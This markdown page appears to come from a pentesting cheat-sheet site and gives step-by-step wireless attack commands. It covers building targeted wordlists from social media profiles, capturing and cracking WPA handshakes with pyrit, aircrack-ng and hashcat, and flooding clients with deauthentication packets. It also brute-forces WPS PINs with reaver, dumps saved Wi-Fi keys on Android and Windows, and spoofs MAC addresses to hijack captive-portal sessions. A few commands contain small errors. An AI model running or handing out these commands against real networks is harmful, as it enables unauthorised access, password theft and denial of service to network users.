---
title: Wireless
category: Exploitation
order: 99
---

> **Monitor Mode** 

{% highlight bash %}
$ sudo airmon-ng start wlan0
{% endhighlight %}

Note: If an error occors try the following:
{% highlight bash %}
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
{% endhighlight %}

> **Break WPA** 

{% highlight bash %}
#Create a pyrit Rainbow table
#Create or select a wordlist
$ cewl http://www.facebookprofile.com >> wordlistUniq.lst 
$ cewl http://www.linkedinprofile.com >> wordlistUniq.lst 
$ grep -h -r  wordlistUniq.lst | sort | uniq > wordlistFinal.lst
$ grep -h -r """" [wordlist] | tr '[:space:]' '\n' | sort | uniq > wordlistUniq.lst 
$ john --wordlist=wordlistFinal.lst --rules:'[chosen rule set]' --stdout > mangledWordlist
# Rule set descriptions http://contest-2010.korelogic.com/rules.html
$ pyrit -e '[SSID]'  create_essid
$ pyrit -i mangledWordlist.txt import_passwords
$ pyrit batch
{% endhighlight %}

{% highlight bash %}
$ airodump-ng wlan0mon;
$ airodump-ng --ignore-negative-one --channel [channel] --bssid [bssid] wlan0mon -w WPAHandshake
#If you don't see a handshake, perform a deauth attack
$ sudo aireplay-ng --ignore-negative-one --deauth 1000 -a [bssid] -c [client MAC] wlan0mon
#Break with pyrite rainbow table
$ pyrit -r WPAHandshake-06.cap attack_batch
#Break with HashCat
$ aircrack-ng -J [SSID] WPAHandshake.cap
C:\ hashcat64.exe -m 2500 [SSID].hccap  rockyou.txt -r rules/best64.rule or PASSWORDSPRO
{% endhighlight %}

> **WPS** 

The following need to be installed:

* [Reaver](https://code.google.com/p/reaver-wps/)

{% highlight bash %}
#Search for WPS that is enabled and not locked
$ sudo wash -i wlan0mon -C

#Once located start the attack
$ sudo reaver -i wlan0mon 00:00:00:00:00:00 -S -v

#If reaver keeps tring 12345670:
$ sudo reaver -i wlan0mon -b 00:24:B2:88:CC:65 -S -v -N
{% endhighlight %}


> **Client Keys** 

Android:
{% highlight bash %}
$ su -c "cat /data/misc/wifi/wpa_supplicant.conf" | grep psk=
{% endhighlight %}

OSX:
{% highlight bash %}
TBD
{% endhighlight %}

Windows:
{% highlight powershell %}
netsh wlan show profile name=”[apname]” key=clear 
{% endhighlight %}

> **Captive Portal: Impersonate Departed User**

[CPSCAM](https://github.com/codewatchorg/cpscam)

Find client: 
{% highlight bash %}
sudo perl cpscam.pl 10.10.10.0 255.255.255.0  
{% endhighlight %}

Change MAC: 
{% highlight bash %}
ifconfig eth 0 down 
ifconfig eth0 hw ether [MAC] 
ifconfig eth0 up
{% endhighlight %}


> **Useful Tools** 

* [http://www.nirsoft.net/utils/wireless_key.html](http://www.nirsoft.net/utils/wireless_key.html)



